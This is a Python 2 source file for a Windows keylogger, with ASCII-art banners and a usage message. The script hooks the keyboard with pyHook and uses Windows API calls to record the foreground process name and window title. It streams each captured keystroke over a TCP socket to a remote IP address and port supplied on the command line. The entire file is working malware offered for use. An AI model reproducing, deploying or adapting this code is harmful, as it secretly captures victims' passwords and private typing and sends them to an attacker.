__author__ = '01'
__author__ += "Binary"
__author__ += "ZeroOne"
__author__ += "Hooman"

from ctypes import * # Fore Windows API
import pythoncom
import pyHook # Python Hooker
import socket
import sys

Kernel32 = windll.kernel32
User32 = windll.user32
Psapi = windll.psapi

Current_Window = None
Sock = None

def Sender(Connection, Data):

    Connection.send(Data)

def Get_Foreground_Proc(Sock):

    # Get A Handle To The Foreground Window
    HandlerWindows = User32.GetForegroundWindow()

    # Find The Process ID
    Pid = c_ulong(0)

    #Get Process ID
    User32.GetWindowThreadProcessId(HandlerWindows, byref(Pid))

    PID = int(Pid.value)

    # Get The Executable Program Name
    ProgramName = create_string_buffer("\x00" * 512)

    # Get A Handle To Process
    HandlerProcess = Kernel32.OpenProcess(0x400 | 0x10, False, Pid)

    #Get Executable Program Name From Handler
    Psapi.GetModuleBaseNameA(HandlerProcess, None, byref(ProgramName), 512)

    WindowTitle = create_string_buffer("\x00" * 512)

    # Read Program Title From Foreground Windows
    Length = User32.GetWindowTextA(HandlerWindows, byref(WindowTitle), 512)

    Data = "\n"

    Data += "Process ID : " + str(PID) + " | Program Name : " + str(ProgramName.value) + " | Title : " + str(WindowTitle.value)

    print Data

    Data += "\n"

    Sender(Sock, Data)

    # Close Handles
    Kernel32.CloseHandle(HandlerWindows)

    Kernel32.CloseHandle(HandlerProcess)

def KeyEvent(event):

    global Current_Window
    global Sock

    # Check Foreground Process
    if event.WindowName != Current_Window :

        Current_Window = event.WindowName
        Get_Foreground_Proc(Sock) # Get Current Process To Hook It

    # Sniff Standard Key
    if (event.Ascii > 32 and event.Ascii < 127) :

        Data = chr(event.Ascii)

        print(Data),

        Sender(Sock, Data)

    return True

def Main(IPAddress, Port) :

    global Sock

    Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    Sock.connect((str(IPAddress), int(Port)))

    # Hook Handler
    Hooker         = pyHook.HookManager() # Hook Manager
    Hooker.KeyDown = KeyEvent # If Key Down ==> Invoking KeyEvent() Function

    # Hooking Loop
    Hooker.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == "__main__" :

    print "[+] Welcome"

    Banner = '''
      000      0
     0   0    01
    1 0   1  0 1
    1  0  1    1
    1   0 1    1
     0   0     1
      000    10001
        =======================================================
     00000
    1     1  100001   0000   1    0  00000      1     00000   0   0
    1        1       1    1  1    0  1    1     1       1      0 0
     00000   00000   0       1    0  1    1     1       1       0
          1  1       0       0    1  00000      0       1       1
    1     1  1       1    1  0    1  1   0      0       1       1
     00000   100001   0000   100001  1    0     0       1       1
    '''

    print Banner

    if(len(sys.argv) != 3) :

        print "Usage : " + sys.argv[0] + " <IPAddress> <Port>"
        exit(0)

    Main(sys.argv[1], sys.argv[2])
